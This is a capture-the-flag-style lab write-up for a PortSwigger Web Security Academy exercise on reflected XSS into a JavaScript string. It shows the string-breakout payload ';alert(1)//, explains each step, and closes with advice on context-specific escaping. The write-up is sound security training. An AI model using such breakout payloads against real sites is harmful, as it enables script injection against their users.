# 🚨 Lab 27 — Reflected XSS into a JavaScript String with Angle Brackets HTML-Encoded

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 27 |
| **Lab Name** | Reflected XSS into a JavaScript string with angle brackets HTML-encoded |
| **Category** | Reflected XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Break out of a JavaScript string and execute arbitrary JavaScript.

---

# 🔍 Injection Point

- Search Bar

---

# 🧠 Vulnerability Overview

User input is reflected into a JavaScript string:

```javascript
var searchTerms = 'USER_INPUT';
```

Angle brackets are encoded, but JavaScript context escaping is missing.

---

# 💣 Payload

```javascript
';alert(1)//
```

---

# ⚔️ Exploitation Steps

## 1️⃣ Inject Payload

```javascript
';alert(1)//
```

---

## 2️⃣ Break Out of String

The payload closes the existing string:

```javascript
'
```

---

## 3️⃣ Inject Arbitrary JavaScript

```javascript
alert(1)
```

---

## 4️⃣ Comment Remaining Code

```javascript
//
```

prevents syntax errors.

✅ Reflected XSS Successfully Triggered

---

# 🧨 Why It Works

The application fails to escape characters inside JavaScript strings.

---

# 🛡️ Prevention

## ✅ Escape JavaScript Context Properly

Escape:

```text
'
"
\
```

inside JavaScript strings.

---

## ✅ Use Safe APIs

Avoid dynamic JavaScript generation.

---

# 💡 Key Takeaway

HTML encoding alone does not protect JavaScript contexts.

Each context requires separate encoding rules.
